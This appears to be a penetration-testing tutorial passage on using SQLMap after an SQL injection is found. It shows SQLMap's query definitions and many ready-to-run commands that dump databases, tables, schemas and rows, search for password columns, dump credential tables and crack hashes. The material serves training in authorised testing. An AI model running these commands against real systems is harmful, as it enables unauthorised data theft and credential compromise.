Enumeration represents the central part of an SQL injection attack, which is done right after the successful detection and confirmation of exploitability of the targeted SQLi vulnerability. It consists of lookup and retrieval (i.e., exfiltration) of all the available information from the vulnerable database.

### SQLMap Data Exfiltration

SQLMap has a predefined set of queries for all supported DBMSes, where each entry represents the SQL that must be run at the target to retrieve the desired content, For example, the excerpts from [queries.xml](https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/queries.xml) for a MySQL DBMS:
```xml
<?xml version="1.0" encoding="UTF-8"?>

<root>
    <dbms value="MySQL">
        <!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html -->
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
...SNIP...
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        <table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/>
        <column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/>
        <is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/>
        <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/>
        <users>
            <inband query="SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES" query2="SELECT user FROM mysql.user" query3="SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
            <blind query="SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1" query2="SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1" query3="SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1" count="SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES" count2="SELECT COUNT(DISTINCT(user)) FROM mysql.user" count3="SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS"/>
        </users>
    ...SNIP...
```

For example if a user wants to retrieve the banner (switch `--banner`) for the target based on MySQL DBMS, the `VERSION()` query will be used for such purposes.
In case of retrieval of the current user name (switch `--current-user`), the `CURRENT_USER()` query will be used.

Another example is retrieving all the usernames (i.e., tag `<users>`). The query marked `inband` is used in non blind situations, the one marked blind is for `blind` situations.

### Basic DB Data Enumeration

Usually, after a successful detection of an SQLi vulnerability, we can begin to enumerate basic details from the database, such as the hostname of the vulnerable target (`--hostname`), current user's name (`--curent-user`), current database name (`--current-db`), or password hashes (`--passwords`). SQLMap will skip SQLi detection if it has been identified earlier and directly start the DBMS enumeration process.

Enumeration usually starts with the retrieval of basic information:

- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights.

The following SQLMap command does all of the above:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.

### Table Enumeration

After founding the database name:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --tables -D <database name>
```

Dumping the found table contents:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --dump -T <table name> -D <database name>
```

Tip: Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.

![[pVBXxRz.webp]]

### Table/Row Enumeration

We can specify columns with the `-C` option:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --dump -T <table name> -D <database name> -C <column name 1>,<column name 2>
```

We can also specify starting and ending row:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --dump -T <table name> -D <data base name> --start=2 --stop=3
```

### Conditional Enumeration

We can retrieve a row based on a known WHERE condition:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --dump -T <table name> -D <database name> --where="name LIKE 'f%'"
```

### Full DB Enumeration

We can retrieve all tables of the database by not specifying the `-T` option (e.g. `--dump -D testdb`). We can use `--dump-all` to dump all content from all databases.

In such cases, a user is also advised to include the switch `--exclude-sysdbs`, which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.

## Advanced Database Enumeration

### DB Schema Enumeration

We can retrieve the structure of all of the tables:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --schema
```

### Searching for Data

We can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the LIKE operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --search -T user

...SNIP...
[14:24:19] [INFO] searching tables LIKE 'user'
Database: testdb
[1 table]
+-----------------+
| users           |
+-----------------+

Database: master
[1 table]
+-----------------+
| users           |
+-----------------+

Database: information_schema
[1 table]
+-----------------+
| USER_PRIVILEGES |
+-----------------+

Database: mysql
[1 table]
+-----------------+
| user            |
+-----------------+

do you want to dump found table(s) entries? [Y/n] 
...SNIP...
```

In the above example, we can immediately spot a couple of interesting data retrieval targets based on these search results. We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --search -C pass

...SNIP...
columns LIKE 'pass' were found in the following databases:
Database: owasp10
Table: accounts
[1 column]
+----------+------+
| Column   | Type |
+----------+------+
| password | text |
+----------+------+

Database: master
Table: users
[1 column]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| password | varchar(512) |
+----------+--------------+

Database: mysql
Table: user
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(41) |
+----------+----------+

Database: mysql
Table: servers
[1 column]
+----------+----------+
| Column   | Type     |
+----------+----------+
| Password | char(64) |
+----------+----------+
```

### Password Enumeration and Cracking

Once we identify a table containing passwords (e.g. `master.users`), we can retrieve that table with the `-T` option, as previously shown:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

SQLMap has automatic password hashes cracking capabilities. Upon retrieving any value that resembles a known hash format, SQLMap prompts us to perform a dictionary-based attack on the found hashes.

Hash cracking attacks are performed in a multi-processing manner, based on the number of cores available on the user's computer. Currently, there is an implemented support for cracking 31 different types of hash algorithms, with an included dictionary containing 1.4 million entries (compiled over the years with most common entries appearing in publicly available password leaks). Thus, if a password hash is not randomly chosen, there is a good probability that SQLMap will automatically crack it.

### DB Users Password Enumeration and Cracking

We can use the `--passwords` switch to attempt to dump the content of system tables containing database-specific credentials (e.g., connection credentials):
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

Tip: The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.

